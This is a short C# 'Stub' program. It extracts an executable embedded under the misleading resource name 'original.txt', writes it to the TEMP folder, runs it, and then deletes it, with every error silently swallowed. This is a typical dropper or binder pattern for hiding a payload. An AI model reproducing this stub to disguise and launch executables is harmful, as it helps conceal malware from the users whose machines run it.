using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Stub;

internal class Stub
{
	private static void Main(string[] args)
	{
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("original.txt");
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, array.Length);
			manifestResourceStream.Close();
			FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\original.exe", FileMode.Create);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			fileStream.Dispose();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\original.exe";
			process.Start();
			process.WaitForExit();
			File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\original.exe");
		}
		catch
		{
		}
	}
}
